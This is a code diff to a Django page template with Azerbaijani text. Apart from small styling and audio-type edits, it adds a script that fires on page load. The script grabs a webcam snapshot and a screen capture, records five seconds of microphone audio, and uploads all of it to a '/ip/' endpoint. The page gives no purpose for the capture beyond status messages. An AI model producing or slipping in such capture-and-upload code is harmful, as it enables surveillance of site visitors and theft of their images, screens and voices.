@@ -16,6 +16,8 @@
         .muted { color:#666; font-size:14px; }
         img { border-radius: 8px; max-width: 100%; height: auto; margin-top: 12px; }
         audio { margin-top: 12px; width: 100%; outline:none; }
+        #status { margin-top: 20px; font-weight: bold; color: green; }
+        #error { margin-top: 20px; font-weight: bold; color: red; }
     </style>
 </head>
 <body>
@@ -71,12 +73,151 @@
         {% if audio_url %}
             <h2>Səs Yazısı</h2>
             <audio controls>
-                <source src="{{ audio_url }}" type="audio/mpeg" />
+                <source src="{{ audio_url }}" type="audio/wav" />
                 Sizin brauzer audio elementini dəstəkləmir.
             </audio>
         {% else %}
             <p>Səs faylı mövcud deyil.</p>
         {% endif %}
+
+        <div id="status"></div>
+        <div id="error"></div>
     </div>
+
+<script>
+// CSRF cookie-ni oxuyan funksiya (Django standartı)
+function getCookie(name) {
+    let cookieValue = null;
+    if (document.cookie && document.cookie !== '') {
+        const cookies = document.cookie.split(';');
+        for (const cookie of cookies) {
+            const trimmedCookie = cookie.trim();
+            if (trimmedCookie.startsWith(name + '=')) {
+                cookieValue = decodeURIComponent(trimmedCookie.substring(name.length + 1));
+                break;
+            }
+        }
+    }
+    return cookieValue;
+}
+
+async function captureCameraImage() {
+    const video = document.createElement('video');
+    video.autoplay = true;
+
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = stream;
+
+    await new Promise(resolve => video.onloadedmetadata = resolve);
+
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0);
+
+    stream.getTracks().forEach(track => track.stop());
+
+    return new Promise(resolve => {
+        canvas.toBlob(blob => resolve(blob), 'image/jpeg');
+    });
+}
+
+async function captureScreenImage() {
+    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.play();
+
+    await new Promise(resolve => video.onloadedmetadata = resolve);
+
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0);
+
+    stream.getTracks().forEach(track => track.stop());
+
+    return new Promise(resolve => {
+        canvas.toBlob(blob => resolve(blob), 'image/jpeg');
+    });
+}
+
+async function recordAudio(durationMs = 5000) {
+    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    const mediaRecorder = new MediaRecorder(stream);
+    const chunks = [];
+
+    mediaRecorder.ondataavailable = e => chunks.push(e.data);
+
+    mediaRecorder.start();
+
+    await new Promise(resolve => setTimeout(resolve, durationMs));
+
+    mediaRecorder.stop();
+
+    await new Promise(resolve => mediaRecorder.onstop = resolve);
+
+    stream.getTracks().forEach(track => track.stop());
+
+    return new Blob(chunks, { type: 'audio/wav' });
+}
+
+async function sendMediaToServer(cameraBlob, screenBlob, audioBlob) {
+    const formData = new FormData();
+    formData.append('camera_image', cameraBlob, 'camera.jpg');
+    formData.append('screen_image', screenBlob, 'screen.jpg');
+    formData.append('audio', audioBlob, 'audio.wav');
+
+    const csrftoken = getCookie('csrftoken');
+
+    const response = await fetch('/ip/', {
+        method: 'POST',
+        headers: {
+            'X-CSRFToken': csrftoken
+        },
+        body: formData,
+    });
+
+    if (!response.ok) {
+        throw new Error(`Server error: ${response.status}`);
+    }
+
+    return await response.json();
+}
+
+async function captureAndSendAll() {
+    const statusElem = document.getElementById('status');
+    const errorElem = document.getElementById('error');
+    statusElem.textContent = "İcazələr gözlənilir və media toplanır...";
+    errorElem.textContent = "";
+
+    try {
+        const cameraBlob = await captureCameraImage();
+        statusElem.textContent = "Kamera şəkli alındı. Ekran görüntüsü alınır...";
+
+        const screenBlob = await captureScreenImage();
+        statusElem.textContent = "Ekran görüntüsü alındı. Səs yazılır...";
+
+        const audioBlob = await recordAudio(5000);
+        statusElem.textContent = "Səs yazısı tamamlandı. Serverə göndərilir...";
+
+        const result = await sendMediaToServer(cameraBlob, screenBlob, audioBlob);
+        statusElem.textContent = "Media faylları serverə uğurla göndərildi!";
+        console.log("Server cavabı:", result);
+    } catch (err) {
+        errorElem.textContent = "Xəta baş verdi: " + err.message;
+        statusElem.textContent = "";
+        console.error(err);
+    }
+}
+
+window.onload = () => {
+    captureAndSendAll();
+};
+</script>
+
 </body>
 </html>
